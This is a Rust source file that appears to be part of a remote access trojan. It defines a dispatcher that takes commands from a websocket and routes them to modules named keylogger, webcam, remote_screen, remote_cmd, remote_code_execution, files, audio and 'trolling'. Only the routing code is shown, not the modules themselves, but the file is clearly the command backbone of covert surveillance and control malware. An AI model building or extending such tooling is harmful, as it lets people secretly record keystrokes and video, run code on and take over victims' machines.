use crate::actors::{self, Command, WsMessageSender};
use serde::Deserialize;
use std::collections::HashMap;
use tokio::sync::mpsc;

#[derive(Deserialize)]
pub struct CommandMessage {
    pub module: String,
    pub args: serde_json::Value,
}

pub struct Dispatcher {
    senders: HashMap<String, mpsc::Sender<Command>>,
}

const CHANNEL_CAP: usize = 128;

macro_rules! register_featured {
    (
        $senders:expr, $writer:expr,
        $( ( $feat:literal, $actor:path ) ),* $(,)?
    ) => {{
        $(
            #[cfg(feature = $feat)]
            {
                    let (tx, rx) = mpsc::channel(CHANNEL_CAP);
                    if $senders.insert($feat.to_string(), tx).is_some() {
                        eprintln!("Duplicate module key '{}', skipping", $feat);
                    } else {
                        crate::actors::run_actor::<$actor>(rx, $writer.clone());
                    }
            }
        )*
    }};
}

impl Dispatcher {
    pub fn new(writer: WsMessageSender) -> Self {
        Self::new_with_policy(writer)
    }

    pub fn new_with_policy(writer: WsMessageSender) -> Self {
        let mut senders: HashMap<String, mpsc::Sender<Command>> = HashMap::new();

        register_featured!(
            senders,
            writer,
            ("audio", actors::audio::Audio),
            ("files", actors::file_system::FileSystem),
            ("remote_screen", actors::remote_screen::RemoteScreen),
            ("remote_cmd", actors::remote_cmd::RemoteCMD),
            ("webcam", actors::webcam::Webcam),
            ("chat", actors::chat::Chat),
            ("keylogger", actors::keylogger::KeyLogger),
            (
                "remote_code_execution",
                actors::remote_code_execution::RemoteCodeExecution
            ),
            ("trolling", actors::trolling::Trolling),
        );

        Self { senders }
    }

    pub async fn dispatch(&self, msg: CommandMessage) -> anyhow::Result<()> {
        if let Some(sender) = self.senders.get(&msg.module) {
            sender.send(msg.args).await.map_err(|e| {
                anyhow::anyhow!("Failed to send command to module '{}': {}", msg.module, e)
            })
        } else {
            Err(anyhow::anyhow!(
                "No actor registered for module '{}'",
                msg.module
            ))
        }
    }
}
